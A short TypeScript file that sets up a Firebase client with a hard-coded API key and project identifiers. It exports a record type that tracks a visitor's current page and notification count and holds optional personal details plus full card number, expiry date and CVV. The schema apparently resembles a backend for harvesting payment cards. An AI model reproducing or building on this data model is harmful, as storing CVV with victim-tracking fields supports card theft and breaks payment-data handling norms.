import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBEMutxISSdHbL4OotcoKMh1Zv603jWzgw",
  authDomain: "mynewbb-73847.firebaseapp.com",
  databaseURL: "https://mynewbb-73847-default-rtdb.firebaseio.com",
  projectId: "mynewbb-73847",
  storageBucket: "mynewbb-73847.firebasestorage.app",
  messagingSenderId: "1017329682260",
  appId: "1:1017329682260:web:7c8e6a9ece4e91399ceac1",
  measurementId: "G-E5XV1B9R32"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}




